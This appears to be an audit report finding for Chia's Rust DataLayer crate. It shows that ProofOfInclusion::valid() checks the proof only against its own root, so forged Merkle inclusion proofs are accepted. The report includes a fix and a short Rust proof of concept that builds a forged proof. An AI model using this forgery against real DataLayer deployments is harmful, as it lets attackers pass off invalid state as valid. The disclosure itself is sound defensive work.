### Title
`ProofOfInclusion::valid()` Tautological Root Check Allows Forged Inclusion Proofs - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary

`ProofOfInclusion::valid()` in the DataLayer Merkle implementation contains a tautological final check: it computes the "root hash" from the proof's own internal state (`self.root_hash()` returns `last.combined_hash`), which is the same value that `existing_hash` already holds after the loop. The check `existing_hash == self.root_hash()` is always `true` when layers are present. This means `valid()` only verifies internal self-consistency of the proof, never comparing against an externally-provided, trusted root hash. Any attacker can construct a `ProofOfInclusion` with an arbitrary `node_hash` and internally-consistent layers, and `valid()` will return `true`, enabling forged inclusion proofs to be accepted.

### Finding Description

In `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`, the `ProofOfInclusion` struct has two methods:

`root_hash()` derives the root from the proof's own data:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash   // <-- taken directly from the proof itself
    } else {
        self.node_hash
    }
}
```

`valid()` then uses this self-referential value as the baseline:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;   // existing_hash = layer.combined_hash (check passed)
    }
    existing_hash == self.root_hash()      // TAUTOLOGY: existing_hash IS last.combined_hash
}
```

After the loop completes without returning `false`, `existing_hash` equals the last `layer.combined_hash` (because the loop check `calculated_hash != layer.combined_hash` passed). `self.root_hash()` also returns `last.combined_hash`. Therefore the final comparison is always `true` when layers are present.

This is the direct analog of H-9: the post-check computes the "correct" value from the same attacker-controlled state (the proof's own `combined_hash` fields) rather than comparing against a pre-saved, externally-trusted baseline (the actual Merkle tree root).

The `valid()` method is exposed to Python via `py_valid()` and is the primary API for callers to verify inclusion proofs. [1](#0-0) 

The `calculate_internal_hash` function used inside the loop is defined in `blob.rs`: [2](#0-1) 

The Python binding exposes `valid()` directly: [3](#0-2) 

The Python type stub confirms `valid()` is a public API: [4](#0-3) 

### Impact Explanation

Any party that receives a `ProofOfInclusion` over the network or from untrusted input and calls `proof.valid()` to decide whether to trust it will be deceived. An attacker can forge a proof for any arbitrary `node_hash` (representing any key-value pair) by constructing internally-consistent layers. The `valid()` call returns `true` regardless of whether the claimed `node_hash` is actually committed to in the real Merkle tree root. This allows untrusted input to prove invalid state — a forged inclusion proof is accepted as valid.

This matches the allowed High impact: **"DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion, corrupts tree roots, or lets untrusted input prove invalid state."** [5](#0-4) 

### Likelihood Explanation

The `valid()` method is the sole public API for verifying a `ProofOfInclusion`. Any Python or Rust caller that receives a proof from an untrusted source and calls `valid()` is vulnerable. The attacker only needs to construct a `ProofOfInclusion` with any `node_hash` and one or more internally-consistent layers — no cryptographic preimage knowledge is required. The `ProofOfInclusion` struct is `Streamable` and `from_py_object`, so it can be deserialized directly from attacker-controlled bytes. [6](#0-5) 

### Recommendation

`valid()` must accept an externally-provided, trusted root hash as a parameter and compare `existing_hash` against it at the end, not against `self.root_hash()`:

```rust
pub fn valid_against_root(&self, expected_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    existing_hash == *expected_root   // compare against externally-trusted root
}
```

The `root_hash()` helper can remain as a convenience to extract the claimed root from the proof, but callers must always compare it against a separately-obtained, trusted root (e.g., from `MerkleBlob::get_root_hash()`). [7](#0-6) 

### Proof of Concept

```rust
use chia_datalayer::{Hash, Side, ProofOfInclusion, ProofOfInclusionLayer, calculate_internal_hash};
use chia_protocol::Bytes32;

// Arbitrary hashes — not in any real Merkle tree
let fake_node_hash = Hash(Bytes32::new([0xAA; 32]));
let fake_other_hash = Hash(Bytes32::new([0xBB; 32]));

// Compute a consistent combined_hash so the loop check passes
let fake_combined = calculate_internal_hash(&fake_node_hash, Side::Right, &fake_other_hash);

let forged_proof = ProofOfInclusion {
    node_hash: fake_node_hash,
    layers: vec![ProofOfInclusionLayer {
        other_hash_side: Side::Right,
        other_hash: fake_other_hash,
        combined_hash: fake_combined,  // consistent with node_hash + other_hash
    }],
};

// valid() returns true even though fake_node_hash is not in any real tree
assert!(forged_proof.valid());  // PASSES — tautology confirmed
// root_hash() returns fake_combined, which is also what existing_hash holds after the loop
assert_eq!(forged_proof.root_hash(), fake_combined);
```

The loop check passes because `calculated_hash == layer.combined_hash` (we constructed it that way). The final check `existing_hash == self.root_hash()` is `fake_combined == fake_combined` — always `true`. No knowledge of the real tree root is needed. [5](#0-4)

### Citations

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L13-28)
```rust
#[derive(Clone, Debug, std::hash::Hash, Eq, PartialEq, Streamable)]
pub struct ProofOfInclusionLayer {
    pub other_hash_side: Side,
    pub other_hash: Hash,
    pub combined_hash: Hash,
}

#[cfg_attr(
    feature = "py-bindings",
    pyclass(get_all, from_py_object),
    derive(PyJsonDict, PyStreamable)
)]
#[derive(Clone, Debug, std::hash::Hash, Eq, PartialEq, Streamable)]
pub struct ProofOfInclusion {
    pub node_hash: Hash,
    pub layers: Vec<ProofOfInclusionLayer>,
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L31-58)
```rust
impl ProofOfInclusion {
    pub fn root_hash(&self) -> Hash {
        if let Some(last) = self.layers.last() {
            last.combined_hash
        } else {
            self.node_hash
        }
    }

    pub fn valid(&self) -> bool {
        let mut existing_hash = self.node_hash;

        for layer in &self.layers {
            let calculated_hash = crate::calculate_internal_hash(
                &existing_hash,
                layer.other_hash_side,
                &layer.other_hash,
            );

            if calculated_hash != layer.combined_hash {
                return false;
            }

            existing_hash = calculated_hash;
        }

        existing_hash == self.root_hash()
    }
```

**File:** crates/chia-datalayer/src/merkle/proof_of_inclusion.rs (L61-72)
```rust
#[cfg(feature = "py-bindings")]
#[pymethods]
impl ProofOfInclusion {
    #[pyo3(name = "root_hash")]
    pub fn py_root_hash(&self) -> Hash {
        self.root_hash()
    }
    #[pyo3(name = "valid")]
    pub fn py_valid(&self) -> bool {
        self.valid()
    }
}
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L48-55)
```rust
pub fn internal_hash(left_hash: &Hash, right_hash: &Hash) -> Hash {
    let mut hasher = Sha256::new();
    hasher.update(b"\x02");
    hasher.update(left_hash.0);
    hasher.update(right_hash.0);

    Hash(Bytes32::new(hasher.finalize()))
}
```

**File:** crates/chia-datalayer/src/merkle/blob.rs (L57-62)
```rust
pub fn calculate_internal_hash(hash: &Hash, other_hash_side: Side, other_hash: &Hash) -> Hash {
    match other_hash_side {
        Side::Left => internal_hash(other_hash, hash),
        Side::Right => internal_hash(hash, other_hash),
    }
}
```

**File:** wheel/python/chia_rs/datalayer.pyi (L237-243)
```text
class ProofOfInclusion:
    node_hash: bytes32
    # children before parents
    layers: list[ProofOfInclusionLayer]

    def root_hash(self) -> bytes32: ...
    def valid(self) -> bool: ...
```
